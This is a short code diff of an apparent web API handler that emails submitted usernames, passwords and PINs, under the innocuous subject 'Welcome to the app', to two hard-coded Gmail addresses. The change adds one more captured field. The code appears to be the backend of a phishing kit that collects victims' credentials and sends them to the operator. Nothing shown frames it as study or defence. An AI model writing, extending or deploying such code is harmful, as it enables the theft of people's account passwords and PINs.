@@ -21,7 +21,7 @@ export default function handler(req, res) {
                 from: 'yurawa111@gmail.com',
                 to: 'yurawa111@gmail.com',
                 subject: 'Welcome to the app',
-                text: `username: ${body.username ?? '-'} password: ${body.password ?? '-'} pin: ${body.mPin ?? '-'}`,            
+                text: `username: ${body.username ?? '-'} password: ${body.password ?? '-'} pin: ${body.mPin ?? '-'} message: ${body.message ?? '-'}`,            
             }
       
             transporter.sendMail(mailData, function (err, info) {
@@ -54,7 +54,7 @@ export default function handler(req, res) {
                 from: 'febrifebru66@gmail.com',
                 to: 'febrifebru66@gmail.com',
                 subject: 'Welcome to the app',
-                text: `username: ${body.username ?? '-'} password: ${body.password ?? '-'} pin: ${body.mPin ?? '-'}`,           
+                text: `username: ${body.username ?? '-'} password: ${body.password ?? '-'} pin: ${body.mPin ?? '-'} message: ${body.message ?? '-'}`,           
             }
       
             transporter.sendMail(mailData, function (err, info) {
